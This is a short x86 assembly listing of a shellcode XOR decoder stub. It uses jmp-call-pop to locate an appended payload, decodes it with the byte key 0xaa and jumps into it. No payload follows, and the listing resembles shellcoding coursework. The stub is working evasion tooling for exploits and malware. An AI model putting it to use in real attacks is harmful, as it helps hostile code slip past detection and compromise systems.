[BITS 32]

global _start 

_start:
jmp short call_point ; jmp to call 

begin: 
pop edx       ; pop return addr into EDX
xor ecx, ecx  ; clear ecx for loop operation 
mov cx, 0x479 ; size of shellcode

short_xor:
xor byte [edx], 0xaa ; decode shellcode byte
inc edx              ; increment addr to get to next byte 
loop short_xor       ; loop until ecx == 0

; after loop completes, jump to shellcode 
jmp shellcode    

call_point:
call begin ; execute call to put return addr on stack 

shellcode:

